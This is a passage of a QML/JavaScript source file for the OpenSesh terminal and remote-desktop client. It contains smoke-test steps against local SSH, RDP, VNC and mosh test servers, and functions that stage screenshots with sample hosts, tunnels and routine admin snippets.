                return wait("the bytes in hexadecimal", () => screen().indexOf("48 69") >= 0 && screen().indexOf("|Hi|") >= 0);
            },
            () => {
                pane.terminal.serialCommand("break", true);
                return wait("the break", () => screen().indexOf("Break sent.") >= 0, () => {
                    console.info("smoke test: a serial port echoed what was typed, showed it in hexadecimal and sent a break");
                    shell.closeTab(shell.currentTab);
                    return [];
                });
            },
            // Mosh: the SSH part (the SSH steps' test server) asks in the pane like an SSH
            // session, then starts mosh-server; a test run starts no mosh-client.
            () => {
                if (!shell.connectTarget("mosh://tester@mosh.example", "tab"))
                    smoke.fail("mosh quick connect opened nothing");
                pane = shell.currentTerminal;
                if (!pane || pane.kind !== "mosh")
                    smoke.fail("the pane isn't a mosh pane");
                const answered = {};
                const answer = () => {
                    const question = pane.terminal.prompt.length > 0 ? JSON.parse(pane.terminal.prompt) : {};
                    if (question.id === undefined || answered[question.id])
                        return;
                    answered[question.id] = true;
                    if (question.kind === "hostKey")
                        pane.terminal.answerPrompt(question.id, "trust-once", []);
                    else
                        pane.terminal.answerPrompt(question.id, "submit", ["right password"]); // lint-qml: allow (the test server's password)
                };
                return wait("mosh-server's session", () => {
                    answer();
                    return screen().indexOf("listening on UDP port 60001") >= 0 && !pane.terminal.running;
                }, () => {
                    if (screen().indexOf("T3BlblNlc2ggdGVzdCBrZQ") >= 0)
                        smoke.fail("the mosh session key was shown");
                    console.info("smoke test: mosh asked in the pane, started its server over SSH and kept the key to itself");
                    shell.closeTab(shell.currentTab);
                    return [];
                });
            },
            // Containers: the command a quick-connect target runs, and the running ones offered
            // in quick connect (a test run lists samples, never runs docker or kubectl).
            () => {
                const podman = Hosts.targetCommand("podman://postgres@db").join(" ");
                if (podman.indexOf("podman exec -it") !== 0 || podman.indexOf("--user postgres db sh -c") < 0)
                    smoke.fail("podman:// runs " + podman);
                const kube = Hosts.targetCommand("kube://shop/api?container=app").join(" ");
                if (kube !== "kubectl exec -it --namespace shop api --container app -- sh -c " + Hosts.targetCommand("docker://x").slice(-1)[0])
                    smoke.fail("kube:// runs " + kube);
                quickConnect.openWith("docker://we");
                return wait("the running containers in quick connect", () => quickConnect.suggestions.some(entry => entry.kind === "running" && entry.text === "docker://web"),
                            () => {
                                quickConnect.close();
                                console.info("smoke test: container targets run docker, podman and kubectl, and quick connect lists the running ones");
                                return [];
                            });
            }
        ];
    }

    // Functions for SmokeTest.steps: remote desktops (Sprint 13) against the RDP test server
    // next to the app (cargo xtask rdp --test-server), never the network. The certificate and
    // the password are asked in the pane (a wrong password first), the desktop shows, keys reach
    // it (Ctrl+Alt+Del repaints its square), text goes both ways on the clipboard (a stand-in
    // for the user's, which a test run leaves alone), the desktop follows the pane's size, and a
    // disconnected pane connects again with a new helper. Then the same through a jump host (the
    // SSH steps' test server), over a local tunnel.
    function desktopSmokeSteps(smoke) {
        const timeout = 20000;
        let deadline = 0;
        let pane = null;
        let rdp = null;
        let asked = [];
        let wrongFirst = false;
        // Question ids start again with each pane.
        let answered = {};
        const desktop = () => pane && pane.desktopView ? pane.desktopView.desktop : null;
        // Each question once: certificates and host keys trusted for this time only (so the next
        // run is asked again), passwords answered (wrong first when `wrongFirst`).
        const answer = () => {
            if (!rdp || rdp.prompt.length === 0)
                return;
            const question = JSON.parse(rdp.prompt);
            if (question.id === undefined || answered[question.id])
                return;
            answered[question.id] = true;
            asked.push(question.kind + (question.certificate ? "-certificate" : "") + (question.retry ? "-retry" : ""));
            if (question.kind === "hostKey") {
                rdp.answerPrompt(question.id, "trust-once", []);
            } else if (question.kind === "password" && wrongFirst && !question.retry) {
                wrongFirst = false;
                rdp.answerPrompt(question.id, "submit", ["wrong password"]); // lint-qml: allow (a wrong password for the test server)
            } else {
                rdp.answerPrompt(question.id, "submit", ["right password"]); // lint-qml: allow (the test server's password)
            }
        };
        // A pixel of the desktop near an RGB colour (RemoteFX is lossy).
        const near = (x, y, rgb) => {
            const text = rdp ? rdp.pixelAt(x, y) : "";
            if (text.length !== 7)
                return false;
            for (let i = 0; i < 3; ++i) {
                if (Math.abs(parseInt(text.substr(1 + 2 * i, 2), 16) - rgb[i]) > 24)
                    return false;
            }
            return true;
        };
        const keySquare = [[0x5e, 0x81, 0xac], [0xa3, 0xbe, 0x8c], [0xeb, 0xcb, 0x8b], [0xbf, 0x61, 0x6a]];
        const state = () => rdp ? (JSON.parse(rdp.connection || "{}").state ?? "") : "";
        const wait = (what, condition, next) => {
            deadline = Date.now() + timeout;
            const poll = () => {
                answer();
                if (condition())
                    return next ? next() : [];
                if (Date.now() > deadline) {
                    smoke.fail("timed out after " + timeout / 1000 + " s waiting for " + what + "; the pane says "
                               + (rdp ? rdp.connection : "nothing") + ", questions asked: " + asked.join(", "));
                    return [];
                }
                return [poll];
            };
            return [poll];
        };
        const open = (text, next) => {
            asked = [];
            answered = {};
            if (!shell.connectTarget(text, "tab"))
                smoke.fail("RDP quick connect opened nothing for " + text);
            pane = shell.currentTerminal;
            rdp = desktop();
            if (!pane || pane.kind !== "rdp" || !rdp)
                smoke.fail("the pane isn't a remote desktop pane");
            return wait("the remote desktop", () => rdp.running && rdp.desktopWidth > 0 && near(48, 48, keySquare[0]), next);
        };
        let narrower = 0;
        let splitId = 0;
        return [
            () => {
                if (AppInfo.startRdpTestServer() <= 0)
                    smoke.fail("the RDP test server didn't start: build it with cargo xtask rdp --test-server");
                wrongFirst = true;
                return open("rdp://tester@desktop.example", () => {
                    if (asked.indexOf("hostKey-certificate") < 0 || asked.indexOf("password-retry") < 0)
                        smoke.fail("the pane didn't ask for the certificate and again for the password: " + asked.join(", "));
                    return [];
                });
            },
            () => {
                // Ctrl, Alt and Del: three keys, so the square takes the fourth colour.
                rdp.sendCtrlAltDel();
                return wait("the keys on the desktop", () => near(48, 48, keySquare[3]));
            },
            () => wait("the server's clipboard text", () => rdp.testClipboard() === "Copied on the OpenSesh RDP test server"), // lint-qml: allow (the test server's text)
            () => {
                rdp.setTestClipboard("Copied in OpenSesh"); // lint-qml: allow (clipboard text for the test server)
                return wait("the clipboard text on the server", () => near(104, 48, keySquare[1]));
            },
            () => {
                const before = rdp.desktopWidth;
                splitId = pane.workspace.splitPane(pane.paneId, "horizontal");
                if (splitId === 0)
                    smoke.fail("the remote desktop pane didn't split");
                return wait("the desktop to follow the narrower pane", () => {
                    narrower = rdp.wantedWidth - rdp.wantedWidth % 2;
                    return rdp.running && rdp.desktopWidth === narrower && narrower < before;
                });
            },
            () => {
                pane.workspace.closePane(splitId);
                rdp.disconnect();
                return wait("the disconnection", () => state() === "disconnected");
            },
            () => {
                rdp.reconnect();
                return wait("the desktop again, with a new helper", () => rdp.running && rdp.desktopWidth > 0, () => {
                    console.info("smoke test: an RDP desktop asked for its certificate and password, took keys and clipboard text both ways, followed the pane's size and connected again");
                    shell.closeTab(shell.currentTab);
                    return [];
                });
            },
            () => open("rdp://tester@desktop.example -J tester@bastion.example", () => {
                console.info("smoke test: an RDP desktop connected through a jump host's tunnel (" + asked.join(", ") + ")");
                shell.closeTab(shell.currentTab);
                return [];
            })
        ];
    }

    // Functions for SmokeTest.steps: VNC desktops (Sprint 14) against the in-process VNC test
    // server, never the network: VeNCrypt's certificate and the password asked in the pane (a
    // wrong password first), the desktop, Ctrl+Alt+Del as keysyms, the clipboard both ways (a
    // stand-in for the user's), the desktop following the pane once asked to, and a disconnected
    // pane connecting again.
    function vncSmokeSteps(smoke) {
        const timeout = 20000;
        let deadline = 0;
        let pane = null;
        let vnc = null;
        let asked = [];
        let answered = {};
        let wrongFirst = false;
        const answer = () => {
            if (!vnc || vnc.prompt.length === 0)
                return;
            const question = JSON.parse(vnc.prompt);
            if (question.id === undefined || answered[question.id])
                return;
            answered[question.id] = true;
            asked.push(question.kind + (question.certificate ? "-certificate" : "") + (question.retry ? "-retry" : ""));
            if (question.kind === "hostKey") {
                vnc.answerPrompt(question.id, "trust-once", []);
            } else if (question.kind === "password" && wrongFirst && !question.retry) {
                wrongFirst = false;
                vnc.answerPrompt(question.id, "submit", ["wrong password"]); // lint-qml: allow (a wrong password for the test server)
            } else {
                vnc.answerPrompt(question.id, "submit", ["right password"]); // lint-qml: allow (the test server's password)
            }
        };
        const near = (x, y, rgb) => {
            const text = vnc ? vnc.pixelAt(x, y) : "";
            if (text.length !== 7)
                return false;
            for (let i = 0; i < 3; ++i) {
                if (Math.abs(parseInt(text.substr(1 + 2 * i, 2), 16) - rgb[i]) > 24)
                    return false;
            }
            return true;
        };
        const keySquare = [[0x5e, 0x81, 0xac], [0xa3, 0xbe, 0x8c], [0xeb, 0xcb, 0x8b], [0xbf, 0x61, 0x6a]];
        const state = () => vnc ? (JSON.parse(vnc.connection || "{}").state ?? "") : "";
        const wait = (what, condition, next) => {
            deadline = Date.now() + timeout;
            const poll = () => {
                answer();
                if (condition())
                    return next ? next() : [];
                if (Date.now() > deadline) {
                    smoke.fail("timed out after " + timeout / 1000 + " s waiting for " + what + "; the pane says "
                               + (vnc ? vnc.connection : "nothing") + ", questions asked: " + asked.join(", "));
                    return [];
                }
                return [poll];
            };
            return [poll];
        };
        return [
            () => {
                if (AppInfo.startVncTestServer() <= 0)
                    smoke.fail("the VNC test server didn't start");
                wrongFirst = true;
                if (!shell.connectTarget("vnc://tester@office-pc.example", "tab"))
                    smoke.fail("VNC quick connect opened nothing");
                pane = shell.currentTerminal;
                vnc = pane && pane.desktopView ? pane.desktopView.desktop : null;
                if (!pane || pane.kind !== "vnc" || !vnc)
                    smoke.fail("the pane isn't a VNC pane");
                return wait("the VNC desktop", () => vnc.running && vnc.desktopWidth > 0 && near(48, 48, keySquare[0]), () => {
                    if (asked.indexOf("hostKey-certificate") < 0 || asked.indexOf("password-retry") < 0)
                        smoke.fail("the pane didn't ask for the certificate and again for the password: " + asked.join(", "));
                    if (!vnc.encrypted)
                        smoke.fail("a VeNCrypt session was taken for unencrypted");
                    return [];
                });
            },
            () => {
                // Ctrl, Alt and Del as keysyms: three keys, the fourth colour.
                vnc.sendCtrlAltDel();
                return wait("the keys on the VNC desktop", () => near(48, 48, keySquare[3]));
            },
            () => wait("the VNC server's clipboard text", () => vnc.testClipboard() === "Copied on the OpenSesh VNC test server"), // lint-qml: allow (the test server's text)
            () => {
                vnc.setTestClipboard("Copied in OpenSesh"); // lint-qml: allow (clipboard text for the test server)
                return wait("the clipboard text on the VNC server", () => near(104, 48, keySquare[1]));
            },
            () => {
                // Scaled to fit by default; asked to follow the pane, the server takes its size.
                pane.desktopView.setScaleMode("dynamic");
                return wait("the VNC desktop to follow the pane", () => {
                    const wanted = vnc.wantedWidth - vnc.wantedWidth % 2;
                    return vnc.running && vnc.desktopWidth === wanted && wanted !== 1024;
                });
            },
            () => {
                vnc.disconnect();
                return wait("the VNC disconnection", () => state() === "disconnected");
            },
            () => {
                answered = {};
                vnc.reconnect();
                return wait("the VNC desktop again", () => vnc.running && vnc.desktopWidth > 0, () => {
                    console.info("smoke test: a VNC desktop asked for its certificate and password, took keys and clipboard text both ways, followed the pane's size and connected again");
                    shell.closeTab(shell.currentTab);
                    return [];
                });
            }
        ];
    }

    // Functions for SmokeTest.steps: the SFTP view's (SftpView.smokeSteps), after the SSH steps
    // started the test server.
    function sftpSmokeSteps(smoke) {
        return [
            () => shell.showView("sftp"),
            () => {
                const sftp = sftpLoader.item;
                if (!sftp || typeof sftp.smokeSteps !== "function") {
                    smoke.fail("the SFTP view didn't load");
                    return [];
                }
                return sftp.smokeSteps(smoke);
            }
        ];
    }

    // Functions for SmokeTest.steps: the Tunnels view's (TunnelsView.smokeSteps), after the SSH
    // steps started the test server.
    function tunnelSmokeSteps(smoke) {
        return [
            () => shell.showView("tunnels"),
            () => {
                const tunnels = tunnelsLoader.item;
                if (!tunnels || typeof tunnels.smokeSteps !== "function") {
                    smoke.fail("the Tunnels view didn't load");
                    return [];
                }
                return tunnels.smokeSteps(smoke);
            }
        ];
    }

    // Functions for SmokeTest.steps: instantiate every view, overlay and layout variant, then
    // run the terminal steps.
    function smokeSteps(smoke) {
        const steps = [];
        let initialView = "hosts";
        const expectVisibleFocus = what => {
            const focused = shell.window.activeFocusItem;
            if (focused && !focused.visible)
                console.warn("AppShell: the keyboard focus stayed on a hidden item after", what);
        };
        steps.push(() => initialView = shell.activeView);
        for (const id of viewIds)
            steps.push(() => shell.showView(id));
        steps.push(() => {
            const settings = settingsLoader.item;
            return settings && typeof settings.smokeSteps === "function" ? settings.smokeSteps() : [];
        });
        if (smoke) {
            steps.push(() => shell.showView("hosts"));
            steps.push(() => {
                const hosts = hostsLoader.item;
                return hosts && typeof hosts.smokeSteps === "function" ? hosts.smokeSteps(smoke) : [];
            });
            steps.push(() => shell.showQuickConnect("deploy@web:2222 -J bastion"));
            steps.push(() => {
                const parsed = JSON.parse(Hosts.parseTarget("deploy@web:2222 -J bastion"));
                if (!parsed.ok || parsed.port !== 2222 || parsed.jump[0] !== "bastion")
                    smoke.fail("quick connect misread deploy@web:2222 -J bastion");
                if (Hosts.parseTarget("web:99999").indexOf("\"ok\":false") < 0)
                    smoke.fail("quick connect took a bad port");
                palette.close();
                quickConnect.close();
            });
            steps.push(() => shell.showView("keychain"));
            steps.push(() => {
                const keychain = keychainLoader.item;
                return keychain && typeof keychain.smokeSteps === "function" ? keychain.smokeSteps(smoke) : [];
            });
            steps.push(() => shell.togglePalette());
            steps.push(() => palette.setQuery("web-01"));
            steps.push(() => {
                if (palette.resultCount === 0)
                    smoke.fail("the command palette offers no host for web-01");
                shell.togglePalette();
            });
        }
        steps.push(() => shell.togglePalette());
        steps.push(() => palette.setQuery("tab"));
        steps.push(() => palette.setQuery("zzzz"));
        steps.push(() => shell.togglePalette());
        steps.push(() => Toasts.show(qsTr("Smoke test notification."), "info"));
        steps.push(() => shell.toggleNotifications());
        steps.push(() => shell.toggleNotifications());
        steps.push(() => shell.showWorkspaces("save"));
        steps.push(() => workspacesDialog.close());
        steps.push(() => shell.toggleSidePanel());
        steps.push(() => sidePanel.currentIndex = 1);
        steps.push(() => sidePanel.currentIndex = 2);
        steps.push(() => shell.toggleSidePanel());
        steps.push(() => shell.newTab());
        steps.push(() => shell.newTab());
        steps.push(() => shell.cycleTab(1));
        steps.push(() => shell.gotoTab(9));
        steps.push(() => shell.showView("terminal"));
        steps.push(() => shell.askRenameTab(shell.currentTab));
        steps.push(() => renameDialog.close());
        steps.push(() => shell.closeTab(shell.currentTab));
        steps.push(() => shell.closeTab(1));
        steps.push(() => shell.cycleRegion(1));
        steps.push(() => shell.cycleRegion(1));
        steps.push(() => shell.cycleRegion(-1));
        // The focus never stays on a hidden view, tab or region.
        steps.push(() => shell.focusRegion(contentArea));
        steps.push(() => shell.showView("history"));
        steps.push(() => expectVisibleFocus("a view switch"));
        steps.push(() => shell.newTab());
        steps.push(() => expectVisibleFocus("opening a tab"));
        steps.push(() => shell.closeTab(shell.currentTab));
        steps.push(() => expectVisibleFocus("closing the last tab"));
        steps.push(() => shell.focusRegion(statusBar));
        steps.push(() => shell.layoutOverride = {
            tabsPosition: "below_title_bar",
            railPosition: "right",
            railLabels: true,
            sidePanelPosition: "left",
            showStatusBar: false
        });
        steps.push(() => expectVisibleFocus("hiding the status bar"));
        steps.push(() => shell.toggleSidePanel());
        steps.push(() => shell.toggleSidePanel());
        steps.push(() => shell.layoutOverride = {});
        steps.push(() => shell.showView(initialView));
        if (smoke)
            steps.push(() => shell.terminalSmokeSteps(smoke));
        return steps;
    }

    // --screenshots: the Hosts view, with one session tab (without a shell) and no popups.
    // The tabs the protocol screenshots made (tab ids).
    property var protocolTabs: ({ telnet: 0, serial: 0 })
    property var desktopTabs: ({ desktop: 0, certificate: 0, vnc: 0 })

    // Screenshots: the tab strip opens (or closes) its menu of shells.
    signal shellMenuRequested(bool open)

    function prepareScreenshot() {
        palette.close();
        notifications.close();
        sidePanelOpen = false;
        if (sessionModel.count === 0)
            insertTab({ startSession: false });
        showView("hosts");
    }

    // --screenshots: a tab split in three (page "splits"), then broadcasting to two of them
    // ("broadcast"), with a pinned tab and tab colors. The panes show the demo frame.
    function prepareTerminalScreenshot(page) {
        closeDialog.close();
        palette.close();
        notifications.close();
        sidePanelOpen = false;
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        insertTab({ startSession: false, customTitle: qsTr("Logs"), color: "purple", pinned: true }); // lint-qml: allow (a tab color name, resolved by Theme)
        const index = insertTab({ startSession: false, customTitle: qsTr("Deploy"), color: "teal" }); // lint-qml: allow (a tab color name, resolved by Theme)
        insertTab({ startSession: false });
        selectTab(index);
        const workspace = currentWorkspace;
        if (!workspace)
            return;
        const right = workspace.splitPane(workspace.focusedPane, "horizontal");
        const bottom = workspace.splitPane(right, "vertical");
        workspace.setRatio("[]", 0.45);
        if (page === "broadcast") {
            workspace.toggleBroadcast();
            workspace.setPaneReceiving(bottom, false);
            workspace.focusPane(right);
        } else if (page === "close") {
            // The question when OpenSesh closes with work running (sample counts: no shells run).
            closeDialog.show(true, 3, 1, 2);
        }
    }

    // --screenshots: the Hosts view with generated hosts, as cards or a list, the host editor and
    // quick connect.
    function prepareHostsScreenshot(page) {
        closeDialog.close();
        closeHostDialogs();
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        Hosts.loadFixture(60);
        showView("hosts");
        const hosts = hostsLoader.item;
        if (hosts) {
            hosts.scope = "all";
            hosts.cards = page !== "list";
            hosts.selectOnly("H00002");
        }
        if (page === "editor")
            editHost("H00001");
        else if (page === "quickconnect")
            showQuickConnect("deploy@web-0");
    }

    // --screenshots: an SSH pane of a sample host with its connection in state `page`: a new host
    // key ("hostkey"), a changed one ("changed"), a one-time code ("code") or disconnected
    // ("disconnected"). The pane shows the demo frame under it.
    function prepareSshScreenshot(page) {
        closeHostDialogs();
        closeKeychainDialogs();
        palette.close();
        notifications.close();
        sidePanelOpen = false;
        const fingerprint = "SHA256:uNiVztksCsDhcc0u9e8BujQXVUpKZIDTMczCvj3tD2s";
        const samples = {
            hostkey: { prompt: { id: 1, kind: "hostKey", host: "db-01.eu-west", port: 22, keyType: "ssh-ed25519",
                    fingerprint: fingerprint, changed: false, otherTypes: [] } },
            changed: { prompt: { id: 1, kind: "hostKey", host: "db-01.eu-west", port: 22, keyType: "ssh-ed25519",
                    fingerprint: fingerprint, changed: true, knownFingerprint: "SHA256:3Yq8GmT0cVbq1kX2hZr5n7Q0fWv9aLpE4sJd6uHc2Ro",
                    file: "~/.ssh/known_hosts", line: 12 } }, // lint-qml: allow (sample data for screenshots)
            code: { prompt: { id: 1, kind: "keyboard", target: "deploy@db-01.eu-west", name: "", instructions: "",
                    fields: [{ label: qsTr("Verification code:"), echo: false }] } },
            disconnected: { connection: { state: "disconnected", code: "network", retryIn: 8,
                    reason: "could not reach 10.0.0.2:22: connection refused" } } // lint-qml: allow (sample data for screenshots)
        };
        const sample = samples[page] ?? {};
        sshSample = {
            connection: sample.connection ? JSON.stringify(sample.connection) : "",
            prompt: sample.prompt ? JSON.stringify(sample.prompt) : ""
        };
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        Hosts.loadFixture(60);
        const id = TerminalSessions.allocateId();
        const seed = { layout: { pane: id }, focused: id, panes: [{ id: id, kind: "ssh", host: "H00001" }] };
        selectTab(insertTab({ startSession: false, seed: JSON.stringify(seed) }));
    }

    // --screenshots: what the SFTP pages show, made for real against the in-process test server
    // (a screenshot run never reaches the network): the SFTP view with this computer's sample
    // folder and the saved host H00000, a finished and a failed transfer in the queue, and an SSH
    // tab to H00000 in its logs folder. `done` runs when all of it is ready (or, with a warning,
    // after 20 s).
    function prepareSftpScreenshots(done) {
        closeHostDialogs();
        closeKeychainDialogs();
        palette.close();
        notifications.close();
        sshSample = null;
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        if (AppInfo.startSshTestServer() <= 0) {
            console.warn("AppShell: no SSH test server for the SFTP screenshots");
            done();
            return;
        }
        Hosts.loadFixture(60);
        showView("sftp");
        const deadline = Date.now() + 20000;
        const answered = {};
        // Answers the questions of a connection (host key, password) once each.
        const answer = (key, promptText, reply) => {
            const question = promptText.length > 0 ? JSON.parse(promptText) : {};
            if (question.id === undefined || answered[key] === question.id)
                return;
            answered[key] = question.id;
            if (question.kind === "hostKey")
                reply(question.id, "trust-once", []);
            else if (question.kind === "password")
                reply(question.id, "submit", ["right password"]); // lint-qml: allow (the test server's password)
        };
        let stage = "view";
        let terminal = null;
        let job = 0;
        screenshotPoll.poll = () => {
            const sftp = sftpLoader.item;
            const left = sftp ? sftp.pane(0) : null;
            const right = sftp ? sftp.pane(1) : null;
            if (Date.now() > deadline) {
                console.warn("AppShell: the SFTP screenshots' setup timed out at", stage);
                return true;
            }
            if (stage === "view") {
                if (!left || !left.ready)
                    return false;
                left.navigate(AppInfo.testFolder() + left.browser.separator + "local");
                sftp.setSource(1, { mode: "remote", hostId: "H00000", target: "", title: JSON.parse(Hosts.hostJson("H00000") || "{}").name ?? "" });
                stage = "connect";
            } else if (stage === "connect") {
                if (!right)
                    return false;
                answer("sftp", right.browser.prompt, (id, action, secrets) => right.browser.answerPrompt(id, action, secrets));
                if (!right.ready || left.browser.rowOf("notes.txt") < 0)
                    return false;
                right.navigate("/logs");
                job = Transfers.copy(left.browser.paneId, left.browser.pathsOf(["notes.txt"]), right.browser.paneId, "/", false);
                Transfers.copy(left.browser.paneId, [left.browser.path + left.browser.separator + "missing.txt"], right.browser.paneId, "/", false);
                stage = "tab";
            } else if (stage === "tab") {
                if (right.browser.path !== "/logs" || Transfers.active > 0)
                    return false;
                if (!connectHost("H00000", "tab"))
                    return true;
                terminal = currentTerminal;
                stage = "shell";
            } else if (stage === "shell") {
                answer("terminal", terminal.terminal.prompt, (id, action, secrets) => terminal.terminal.answerPrompt(id, action, secrets));
                if (terminal.terminal.screenText().indexOf("test$") < 0)
                    return false;
                terminal.terminal.sendText("cd /logs\r");
                stage = "folder";
            } else if (stage === "folder") {
                if (terminal.terminal.shellDirectory !== "/logs")
                    return false;
                stage = "monitor";
            } else if (stage === "monitor") {
                // The remote monitor's readings (CPU needs two) and the host info, for the status
                // bar and the Info tab.
                const reading = terminal.terminal.monitor.length > 0 ? JSON.parse(terminal.terminal.monitor) : {};
                if (reading.cpu === undefined || reading.cpu === null)
                    return false;
                terminal.terminal.readHostInfo();
                stage = "info";
            } else if (stage === "info") {
                if (terminal.terminal.hostInfo.indexOf("\"state\":\"ready\"") < 0)
                    return false;
                showView("sftp");
                return true;
            }
            return false;
        };
        screenshotPoll.done = done;
        screenshotPoll.start();
    }

    // --screenshots: the SFTP view (page "view"), a file's permissions over it ("permissions"),
    // or the SSH tab with the side panel's files ("panel"); prepareSftpScreenshots ran first.
    function prepareSftpScreenshot(page) {
        const sftp = sftpLoader.item;
        const right = sftp ? sftp.pane(1) : null;
        if (right)
            right.closeDialogs();
        if (page === "panel" || page === "info") {
            selectTab(sessionModel.count);
            setSidePanelOpen(true);
            sidePanel.currentIndex = page === "info" ? 1 : 0;
            return;
        }
        setSidePanelOpen(false);
        showView("sftp");
        if (right && page === "permissions") {
            right.selectRow(right.browser.rowOf("app-000.log"), 0);
            right.permissions();
        } else if (right) {
            right.clearSelection();
        }
    }

    // --screenshots: sample tunnels for the Tunnels pages, run for real against the in-process
    // test server (never the network): three running (one with traffic), one tied to a host
    // with no session (waiting), one that listens on every interface (off), and one whose port
    // is taken (failed). `done` runs when they are there (or, with a warning, after 20 s).
    function prepareTunnelsScreenshots(done) {
        palette.close();
        notifications.close();
        sidePanelOpen = false;
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        if (AppInfo.startSshTestServer() <= 0) {
            console.warn("AppShell: no SSH test server for the Tunnels screenshots");
            done();
            return;
        }
        Hosts.loadFixture(60);
        showView("tunnels");
        const web = AppInfo.startHttpTestServer();
        const make = fields => Tunnels.save(JSON.stringify(Object.assign({
            host: "H00000",
            target: "",
            bindAddress: "127.0.0.1",
            bindPort: 0,
            destinationHost: "127.0.0.1",
            destinationPort: web,
            tied: false,
            autostart: false,
            reconnect: true
        }, fields)));
        const staging = make({ name: qsTr("Staging web"), kind: "local", bindPort: 18081 });
        const running = [staging,
                         make({ name: qsTr("Preview for the team"), kind: "remote", destinationHost: "localhost" }), // lint-qml: allow (sample data for screenshots)
                         make({ name: qsTr("SOCKS through web-01"), kind: "dynamic", bindPort: 11080 })];
        // Another host than the one of the SFTP screenshots' SSH tab: no session, so it waits.
        const grafana = make({ name: qsTr("Grafana"), kind: "local", host: "H00001", bindPort: 13000, // lint-qml: allow (sample data for screenshots)
                               destinationHost: "grafana.internal", destinationPort: 3000, tied: true, autostart: true }); // lint-qml: allow (sample data for screenshots)
        make({ name: qsTr("Shared dev server"), kind: "local", bindAddress: "0.0.0.0", bindPort: 18080, // lint-qml: allow (sample data for screenshots)
               destinationHost: "dev.internal", destinationPort: 8080 }); // lint-qml: allow (sample data for screenshots)
        const metrics = make({ name: qsTr("Metrics"), kind: "local", bindPort: 18081, destinationHost: "metrics.internal", // lint-qml: allow (sample data for screenshots)
                               destinationPort: 9090 });
        for (const id of running.concat([grafana]))
            Tunnels.setOn(id, true);
        const deadline = Date.now() + 20000;
        const answered = {};
        let requests = 0;
        let stage = "running";
        const entry = id => JSON.parse(Tunnels.list || "[]").find(tunnel => tunnel.id === id) ?? {};
        screenshotPoll.poll = () => {
            if (Date.now() > deadline) {
                console.warn("AppShell: the Tunnels screenshots' setup timed out at", stage, Tunnels.list);
                return true;
            }
            for (const tunnel of JSON.parse(Tunnels.list || "[]")) {
                if (tunnel.prompt.length === 0)
                    continue;
                const question = JSON.parse(tunnel.prompt);
                if (answered[tunnel.id] === question.id)
                    continue;
                answered[tunnel.id] = question.id;
                if (question.kind === "hostKey")
                    Tunnels.answerPrompt(tunnel.id, question.id, "trust-once", []);
                else
                    Tunnels.answerPrompt(tunnel.id, question.id, "submit", ["right password"]); // lint-qml: allow (the test server's password)
            }
            if (stage === "running") {
                if (!running.every(id => entry(id).state === "running"))
                    return false;
                // Some traffic through the first one.
                if (requests < 3) {
                    requests += 1;
                    const request = new XMLHttpRequest();
                    request.open("GET", "http://127.0.0.1:" + entry(staging).port + "/");
                    request.send();
                    return false;
                }
                Tunnels.setOn(metrics, true);
                stage = "failed";
            } else if (stage === "failed") {
                return entry(metrics).state === "failed" && entry(staging).total >= 3;
            }
            return false;
        };
        screenshotPoll.done = done;
        screenshotPoll.start();
    }

    // --screenshots: the Tunnels view (page "view"), the editor of the tunnel that listens on
    // every interface ("editor"), or the import dialog ("import").
    function prepareTunnelsScreenshot(page) {
        const tunnels = tunnelsLoader.item;
        showView("tunnels");
        if (!tunnels)
            return;
        tunnels.closeDialogs();
        if (page === "editor") {
            const shared = JSON.parse(Tunnels.list || "[]").find(tunnel => tunnel.bindAddress === "0.0.0.0");
            if (shared)
                tunnels.edit(shared.id);
        } else if (page === "import") {
            tunnels.showImport();
        }
    }

    // --screenshots: sample snippets and recordings (in memory: a test run never writes them),
    // and a terminal tab for the quick picker and the paste review.
    function prepareSnippetsScreenshots() {
        palette.close();
        notifications.close();
        sidePanelOpen = false;
        const tunnels = tunnelsLoader.item;
        if (tunnels)
            tunnels.closeDialogs();
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        const save = fields => Snippets.save(JSON.stringify(Object.assign({
            id: "", folder: "", tags: [], description: "", shortcut: "", text: "", steps: [], macro: false
        }, fields)));
        const send = line => ({ kind: "send", text: line + "\n" }); // lint-qml: allow (sample data for screenshots)
        const wait = (pattern, timeout) => ({ kind: "wait", pattern: pattern, timeout: timeout });
        save({ name: qsTr("Restart a service"), folder: "Ops/Web", tags: ["systemd"], shortcut: "Ctrl+Alt+R",
               description: qsTr("Restarts it and shows how it is doing"),
               text: "sudo systemctl restart {{service}}\nsystemctl status {{service}} --no-pager\n" }); // lint-qml: allow (sample data for screenshots)
        save({ name: qsTr("Follow the app log"), folder: "Ops/Web", tags: ["logs"],
               text: "tail -f /var/log/{{app}}/current.log\n" }); // lint-qml: allow (sample data for screenshots)
        save({ name: qsTr("Disk usage"), folder: "Ops", tags: ["disk"],
               text: "df -h && sudo du -sh /var/* 2>/dev/null | sort -h | tail\n" }); // lint-qml: allow (sample data for screenshots)
        save({ name: qsTr("Database shell"), folder: "Ops/DB", tags: ["postgres"],
               description: qsTr("Types the password of db-prod from the keychain"),
               text: "psql -h {{host}} -U app -W\n{{secret:db-prod}}\n" }); // lint-qml: allow (sample data for screenshots)
        deployMacro = save({ name: qsTr("Deploy the web app"), folder: "Deploy", tags: ["deploy"], macro: true,
                             steps: [send("cd /srv/web"), wait("\\$ $", 5000), send("git pull --ff-only"),
                                     wait("Already up to date|Fast-forward", 30000), { kind: "delay", ms: 500 },
                                     send("sudo systemctl reload nginx")] });
        Recordings.loadFixture();
        const pane = TerminalSessions.allocateId();
        const recording = JSON.parse(Recordings.list || "[]")[0];
        const playerIndex = insertTab({
            startSession: false,
            seed: JSON.stringify({ layout: { pane: pane }, focused: pane,
                                   panes: [{ id: pane, kind: "player", target: recording ? recording.path : "" }] })
        });
        playerTab = sessionModel.get(playerIndex - 1).tabId;
        selectTab(insertTab({ startSession: false, customTitle: qsTr("web-01"), color: "teal" })); // lint-qml: allow (a tab color name, resolved by Theme)
        snippetsTab = currentTabId;
    }

    // --screenshots: the Snippets view, the snippet editor on a macro, the quick picker, the
    // paste review, and the History view.
    function prepareSnippetsScreenshot(page) {
        snippetEditor.close();
        snippetPicker.close();
        if (currentWorkspace && currentWorkspace.askingToPaste)
            currentWorkspace.answerPaste(false);
        if (page === "view" || page === "editor") {
            showView("snippets");
            if (page === "editor")
                editSnippet(deployMacro);
        } else if (page === "history") {
            showView("history");
        } else if (page === "player") {
            selectTabById(playerTab);
